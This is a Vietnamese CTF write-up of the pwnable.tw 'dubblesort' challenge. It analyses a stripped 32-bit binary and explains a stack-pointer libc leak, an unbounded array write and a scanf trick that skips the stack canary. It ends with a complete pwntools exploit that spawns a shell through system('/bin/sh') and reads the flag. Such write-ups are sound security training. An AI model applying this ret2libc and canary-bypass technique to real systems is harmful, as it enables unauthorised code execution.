+++
title = 'Pwnable.tw - dubblesort'
date = 2026-02-16T10:53:32+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## dubblesort

`nc chall.pwnable.tw 10101`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/doublesort/dubblesort
Arch:       i386-32-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
FORTIFY:    Enabled
```

Bật đủ bảo vệ, binary `stripped`. `main` ở offset `0x9c3`:

```asm
 9da:  mov    eax,gs:0x14
 9e0:  mov    DWORD PTR [esp+0x7c],eax      ; canary tại esp+0x7c
 9fc:  call   6f0 <__printf_chk@plt>        ; "What your name :"
 a01:  mov    DWORD PTR [esp+0x8],0x40
 a09:  lea    esi,[esp+0x3c]                ; name buffer
 a18:  call   630 <read@plt>                ; read(0, esp+0x3c, 0x40)
 a1d:  mov    DWORD PTR [esp+0x8],esi
 a32:  call   6f0 <__printf_chk@plt>        ; "Hello %s,How many numbers..."
 a37:  lea    eax,[esp+0x18]
 a48:  call   700 <__isoc99_scanf@plt>      ; scanf("%u", esp+0x18) -> count
 a55:  lea    edi,[esp+0x1c]                ; mảng số
 a73:  call   6f0 <__printf_chk@plt>        ; "Enter the %d number : "
 a83:  call   640 <fflush@plt>
 a95:  call   700 <__isoc99_scanf@plt>      ; scanf("%u", &arr[i])
 aa6:  ja     a5e                           ; lặp count lần
 ab3:  call   931 <sort>
 ac1:  call   6a0 <puts@plt>                ; "Result :"
```

Viết lại:

```c
char name[0x40];        // esp+0x3c
unsigned int count;     // esp+0x18
unsigned int arr[];     // esp+0x1c
// canary               // esp+0x7c

printf("What your name :");
read(0, name, 0x40);
printf("Hello %s,How many numbers do you what to sort :", name);
scanf("%u", &count);
for (i = 0; i < count; i++) {
    printf("Enter the %d number : ", i);
    fflush(stdout);
    scanf("%u", &arr[i]);
}
sort(arr, count);
```

Hàm `sort` ở `0x931` là bubble sort, so sánh bằng `jbe` nên sắp xếp tăng dần theo `unsigned`:

```asm
 981:  mov    edx,DWORD PTR [eax]
 983:  mov    esi,DWORD PTR [eax+0x4]
 986:  cmp    edx,esi
 988:  jbe    98f
 98a:  mov    DWORD PTR [eax],esi           ; swap
 98c:  mov    DWORD PTR [eax+0x4],edx
```

#### Bug 1 - Uninitialized read leak libc

`read(0, name, 0x40)` không thêm null byte, mà `printf("Hello %s,...")` lại in `name` bằng `%s` nên nó in tiếp vùng nhớ sau buffer tới khi gặp `\x00`. Trên stack ngay sau `name` còn sót con trỏ libc từ phần khởi tạo, nên nhập vừa đủ bytes để nối liền tới con trỏ đó là leak được libc.

#### Bug 2 - `count` không bị giới hạn

`count` nhập tùy ý, vòng lặp ghi `arr[i]` với `i < count` nên ghi tràn hết stack frame, qua cả canary và địa chỉ trả về.

Mảng ở `esp+0x1c`, canary ở `esp+0x7c`:

```js
(0x7c - 0x1c) / 4 = 24
```

Nên `arr[24]` chính là canary.

#### Bug 3 - `scanf("%u")` fail thì không ghi

Nếu nhập `+` thì `scanf` không parse được, trả về `0` và **không ghi gì vào biến**, nhưng vòng lặp vẫn tăng `i`. Nhờ vậy bỏ qua được đúng slot canary mà không làm hỏng nó.

### 2. Khai thác

#### Leak libc

Gửi name đủ dài để `%s` chạy sang con trỏ libc. Local và remote lệch nhau vì layout stack khác nhau:

```py
# name = b'A' * 24   --> local
name = b'A' * 28     # remote
sla(b'name :', name)
rl()
raw = r(3)
leak = u32(raw + b'\x00') << 8
libc.address = leak - 0x1b0000
```

`sla` gửi kèm `\n`, byte `\n` này đè lên byte thấp nhất của con trỏ nên chỉ lấy lại được 3 bytes cao. Dịch `<< 8` để trả về đúng vị trí, byte thấp coi như `0x00` - chấp nhận được vì con trỏ đó align trang.

Local kiểm chứng với offset 24:

```bash
[*] Leaked libc address: 0xee9a6000
[*] Libc base: 0xee7f6000
[*] system: 0xee830940
[*] /bin/sh: 0xee94ee8b
```

`libc base` ra số tròn trang nên offset `0x1b0000` là đúng. Offset này phụ thuộc đúng bản libc đi kèm, đổi libc là phải đo lại.

#### Ghi đè return address

Nhập `count = 35`, điền 24 số nhỏ cho `arr[0..23]`, gửi `+` để nhảy qua canary, rồi điền `system` và `/bin/sh` vào phần sau:

```py
slna('sort :', 35)
for i in range(24):
    slna('number :', i)
sla('number :', '+')
for i in range(24, 33):
    slna('number :', system)
slna('number :', binsh)
```

Chỗ này phải để ý: `sort` sắp xếp cả `count = 35` phần tử, tức canary cũng bị đem đi sort. Vì vậy 24 giá trị đầu cố tình nhập `0..23` (rất nhỏ) và phần ghi đè đều là địa chỉ libc (`0xf7xxxxxx`, rất lớn), canary thì luôn có byte thấp bằng `0x00` nên gần như chắc chắn nằm giữa hai nhóm và không bị đổi chỗ. Gần như, không phải luôn luôn - gặp canary có byte cao lớn hơn libc base thì chạy lại là xong.

Việc điền `system` 9 lần liên tiếp cũng vì lý do đó: các giá trị bằng nhau thì sort không đảo thứ tự, và nó phủ kín các thanh ghi được `pop` lại cùng với return address, nên không cần biết chính xác slot nào là return address.

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('dubblesort_patched', checksec=False)
libc = ELF('libc_32.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'i386'
context.endian = 'little'

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r      = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)
rl     = lambda proc=None: proc.recvline() if proc else p.recvline()
ru     = lambda delim=b'\n', proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim)

def GDB():
    gdb.attach(p, gdbscript="""
        b*main+85
        b*main+237
        b*main+310
    """)

if args.REMOTE:
    p = remote("chall.pwnable.tw", int("10101"))
else:
    p = process([exe.path])
    if args.GDB:
        GDB()

# LEAK LIBC ADDRESS
# name = b'A' * 24   --> Local offset
name = b'A' * 28
sla(b'name :', name)
rl()
raw = r(3)
leak = u32(raw + b'\x00') << 8
info(f"Leaked libc address: {hex(leak)}")
libc.address = leak - 0x1b0000
info(f"Libc base: {hex(libc.address)}")
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
info(f"system: {hex(system)}")
info(f"/bin/sh: {hex(binsh)}")

# EXPLOIT
slna('sort :', 35)
for i in range(24):
    slna('number :', i)
sla('number :', '+')
for i in range(24, 33):
    slna('number :', system)
slna('number :', binsh)

sl('cat /home/dubblesort/flag')

p.interactive()
```
